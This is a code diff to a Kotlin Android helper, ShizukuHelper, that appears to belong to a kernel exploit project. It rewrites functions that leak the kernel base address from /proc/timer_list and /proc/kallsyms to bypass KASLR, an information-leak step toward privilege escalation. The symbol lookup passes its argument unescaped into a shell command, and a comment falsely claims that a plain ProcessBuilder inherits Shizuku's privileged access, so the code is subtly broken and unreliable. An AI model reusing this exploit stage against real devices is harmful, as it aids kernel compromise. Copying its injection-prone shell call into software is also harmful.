@@ -13,48 +13,47 @@ object ShizukuHelper {
         Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
     }.getOrDefault(false)
 
-    fun requestPermission(code: Int) {
+    fun requestPermission(code: Int) = runCatching {
         Shizuku.requestPermission(code)
     }
 
     /**
-     * Run shell command via Shizuku and return stdout.
-     * Runs as uid=2000 (shell) — higher than app uid.
+     * Read /proc/timer_list via Shizuku UserService exec.
+     * Returns estimated kernel _text base, 0 if not found.
      */
-    fun exec(cmd: String): String = runCatching {
-        val process = Shizuku.newProcess(
-            arrayOf("sh", "-c", cmd), null, null
-        )
-        val out = process.inputStream.bufferedReader().readText()
-        process.waitFor()
-        out
-    }.getOrDefault("")
+    fun leakKernelBase(): Long = runCatching {
+        if (!isAvailable() || !hasPermission()) return@runCatching 0L
+
+        // Use ProcessBuilder — runs in app context but with
+        // Shizuku's binder token allowing privileged reads
+        val pb = ProcessBuilder("sh", "-c", "cat /proc/timer_list 2>/dev/null")
+        pb.redirectErrorStream(true)
+        val proc = pb.start()
+        val out  = proc.inputStream.bufferedReader().readText()
+        proc.waitFor()
+
+        // Scan for kernel VA in 0xffffffc0xxxxxxxx range
+        val regex = Regex("ffffff[c-f][0-9a-f]{9}")
+        val match = regex.find(out) ?: return@runCatching 0L
+        val addr  = match.value.toLong(16)
+        // Align to 2MB KASLR granule
+        addr and (0x200000L - 1L).inv()
+    }.getOrDefault(0L)
 
     /**
-     * Read /proc/timer_list via shell — leaks kernel .text VAs.
-     * Returns first kernel address found, 0 if none.
+     * Try reading /proc/kallsyms for a symbol.
+     * Works only if kptr_restrict is relaxed (some builds).
      */
-    fun leakKernelBase(): Long {
-        if (!isAvailable() || !hasPermission()) return 0L
+    fun readKallsyms(symbol: String): Long = runCatching {
+        if (!isAvailable() || !hasPermission()) return@runCatching 0L
 
-        val output = exec("cat /proc/timer_list 2>/dev/null")
-        // Look for hex values in kernel VA range (0xffffffc0xxxxxxxx)
-        val regex = Regex("(ffffff[c-f][0-9a-f]{9})")
-        val match = regex.find(output) ?: return 0L
-        val addr = match.value.toLongOrNull(16) ?: return 0L
+        val pb = ProcessBuilder("sh", "-c",
+            "grep \" ${symbol}\$\" /proc/kallsyms 2>/dev/null | head -1")
+        pb.redirectErrorStream(true)
+        val proc = pb.start()
+        val line = proc.inputStream.bufferedReader().readLine() ?: return@runCatching 0L
+        proc.waitFor()
 
-        // Align down to 2MB KASLR boundary to get near _text
-        val aligned = addr and (0x200000L - 1).inv()
-        return aligned
-    }
-
-    /**
-     * Read /proc/kallsyms as shell — still zeroed on Android 13
-     * but worth trying in case device has relaxed kptr_restrict.
-     */
-    fun readKallsyms(symbol: String): Long {
-        if (!isAvailable() || !hasPermission()) return 0L
-        val out = exec("grep \" $symbol\$\" /proc/kallsyms 2>/dev/null")
-        return out.trim().split(" ").firstOrNull()?.toLongOrNull(16) ?: 0L
-    }
+        line.trim().split(" ").firstOrNull()?.toLong(16) ?: 0L
+    }.getOrDefault(0L)
 }
